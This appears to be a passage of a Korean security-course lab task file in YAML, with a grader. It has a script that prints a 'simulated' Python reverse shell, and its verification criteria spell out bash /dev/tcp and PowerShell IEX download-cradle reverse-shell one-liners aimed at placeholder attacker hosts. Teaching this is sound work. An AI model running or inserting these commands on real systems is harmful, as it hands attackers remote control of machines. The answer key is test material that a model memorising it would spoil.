    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
  answer_detail: '[공격] 실제 연결 없는 교육 버전.'
  verify:
    type: output_contains
    expect: simulated
    field: stdout
    semantic:
      intent: '리버스 셸 원라이너 (교육) — bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1 (Linux)
        또는 powershell IEX (New-Object Net.WebClient).DownloadString(...). fileless
        특성: 디스크 파일 없이 메모리 실행. 교육 목적 샘플만'
      success_criteria:
      - 리버스 셸 원라이너
      - fileless 특성
      acceptable_methods:
      - bash + /dev/tcp
      - powershell IEX
      negative_signs:
      - 실행 (교육 목적 초과)
  target_vm: web
  script: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''

    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
